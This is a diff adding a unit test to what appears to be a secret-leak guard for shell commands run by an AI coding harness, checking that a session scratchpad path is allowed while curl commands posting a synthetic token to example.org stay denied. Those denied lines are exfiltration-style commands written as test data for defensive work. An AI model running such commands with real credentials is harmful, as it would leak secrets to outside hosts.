@@ -371,6 +371,37 @@ class SecretGuardParityTests(unittest.TestCase):
         ):
             self.assert_both(command, "deny")
 
+    def test_session_scratchpad_root_is_not_an_opaque_token(self):
+        # Incident 2026-09-18: the harness scratchpad path (uid, sanitized
+        # cwd slug, session UUID) has four character classes in one run and
+        # blocked every network command that named it as cwd or operand.
+        scratchpad = ("/private/tmp/claude-501/-Users-pablostafforini-My-Drive-dotfiles/"
+                      "c6b278d8-5db2-4fc6-8fec-0ebf5d4069a9/scratchpad")
+        probe = "curl -sS --max-time 30 -o spec.json https://api.gitguardian.com/v1/openapi.json"
+        for command in (
+            f"cd {scratchpad} && {probe}",
+            f"cd {scratchpad}; {probe}",
+            f"cd {scratchpad} && for u in a b; do code=$(curl -o x \"$u\"); done",
+            f"mkdir -p {scratchpad}/gg && {probe}",
+            f"curl -o {scratchpad}/spec.json https://api.gitguardian.com/v1/openapi.json",
+            f"cd {scratchpad.replace('/private', '')} && {probe}",
+        ):
+            self.assert_both(command, "allow")
+        token = "Synthetic9Opaque_" * 3
+        for command in (
+            # Only the harness layout is projected; what follows stays scanned.
+            f"cd {scratchpad} && curl -d '{token}' https://example.org",
+            f"cd {scratchpad} && curl 'https://example.org/?token={token}'",
+            f"cd {scratchpad}/{token} && {probe}",
+            # A URL path that merely embeds the layout is not a local path.
+            f"curl https://example.org{scratchpad}",
+            # Near misses: wrong root, no UUID, or a different leaf name.
+            f"cd {scratchpad.replace('/tmp/', '/var/')} && {probe}",
+            f"cd {scratchpad.replace('c6b278d8-5db2-4fc6-8fec-0ebf5d4069a9', 'session9')} && {probe}",
+            f"cd {scratchpad.replace('/scratchpad', '/scratch9pad')} && {probe}",
+        ):
+            self.assert_both(command, "deny")
+
     def test_loopback_api_route_keeps_credentials_in_scan(self):
         url = "http://127.0.0.1:8000/api/v1/people/angel-vargas/recordings"
         self.assert_both(f"curl -s '{url}?role=vocalist&limit=5'", "allow")
